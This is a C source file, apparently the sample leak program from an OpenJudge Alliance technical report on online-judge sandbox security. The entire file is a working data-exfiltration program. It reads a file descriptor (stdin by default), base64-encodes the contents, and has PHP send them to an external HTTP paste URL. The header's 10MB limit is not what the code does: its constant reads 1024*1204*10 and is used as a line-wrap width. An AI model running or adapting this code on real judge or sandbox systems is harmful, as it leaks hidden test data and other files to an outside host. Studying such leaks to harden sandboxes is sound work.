/**
 * @copyright (c) 2011, OpenJudge Alliance <http://openjudge.net>
 * @author LIU Yu <pineapple.liu@gmail.com>
 * @date 2011/12/13
 * 
 * This program source code is part of the OpenJudge Alliance Technical Report 
 * (TR-OJA-201112A) at <http://openjudge.net/Report/201112A>.
 *
 * DESCRIPTION:
 * 
 * This is the sample leak program discussed in the above-mentioned technical 
 * report TR-OJA-201112A. It does three things,
 * 
 * 1. read the first 10MB content of the file descriptor specified as the first
 *    command line argument or 0 by default;
 * 2 encode the content of the file in base64 format;
 * 3 post the encoded string to an HTTP URL by means of the PHP interpreter;
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void encode(FILE *, FILE *, int);

int main(int argc, char * argv[])
{
    int fd = ((argc <= 1) ? 0 : atoi(argv[1]));
    lseek(fd, 0, SEEK_SET);
    FILE * fin = fdopen(fd, "r");
    FILE * fout = popen("/php", "w");
    if (fin && fout)
    {
        fprintf(fout, "<?php @fopen('http://openjudge.net/cgi-bin/paste.py?data='.urlencode('");
        encode(fin, fout, 1024 * 1204 * 10);
        fprintf(fout, "'), 'r');\n");
    }
    if (fout) fclose(fout);
    return 0;
}

/* base64 encoding from http://base64.sourceforge.net/b64.c */

static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void encodeblock(unsigned char in[3], unsigned char out[4], int len)
{
    out[0] = cb64[in[0] >> 2];
    out[1] = cb64[((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)];
    out[2] = (unsigned char) ((len > 1) ? cb64[((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)] : '=');
    out[3] = (unsigned char) ((len > 2) ? cb64[in[2] & 0x3f] : '=');
}

void encode(FILE * fin, FILE * fout, int wrap)
{
    unsigned char in[3], out[4];
    int i, len, blocksout = 0;
    while(!feof(fin))
    {
        len = 0;
        for (i = 0; i < 3; i++)
        {
            in[i] = (unsigned char)getc(fin);
            if(!feof(fin)) len++; else in[i] = 0;
        }
        if (len)
        {
            encodeblock( in, out, len );
            for (i = 0; i < 4; i++) fputc(out[i], fout);
            blocksout++;
        }
        if (blocksout >= (wrap / 4) || feof(fin))
        {
            if (blocksout) fprintf(fout, "\r\n");
            blocksout = 0;
        }
    }
}
